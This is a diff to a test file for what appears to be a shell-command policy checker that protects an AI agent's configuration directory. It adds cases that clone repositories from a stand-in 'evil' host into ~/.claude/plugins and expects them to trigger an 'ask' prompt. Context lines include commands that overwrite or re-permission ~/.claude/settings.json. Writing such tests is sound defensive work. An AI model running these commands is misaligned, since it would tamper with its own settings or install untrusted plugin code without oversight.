@@ -120,6 +120,12 @@ BASH_CASES = [
     ("chmod --reference=/var/tmp/mode ~/.claude/settings.json", "deny", "claude-settings"),
     ("printf x > \"$(echo $HOME/.claude/settings.json)\"", "deny", "claude-settings"),
     ("curl -sSL https://example.com/s -o out.json", None, None),
+    # git checkouts into a protected directory (PR review).
+    ("git clone https://example.invalid/evil ~/.claude/plugins/evil", "ask", "agent-config-dir"),
+    ("cd ~/.claude/plugins && git clone https://example.invalid/evil.git", "ask", "agent-config-dir"),
+    ("git -C ~/.claude clone --depth 1 https://example.invalid/e.git plugins/e", "ask", "agent-config-dir"),
+    ("git worktree add ~/.claude/x", "ask", "agent-config-dir"),
+    ("git clone https://example.invalid/e.git vendor/e", None, None),
     # Reads and ordinary writes.
     ("cat ~/.claude/settings.json", None, None),
     ("jq . .mcp.json", None, None),
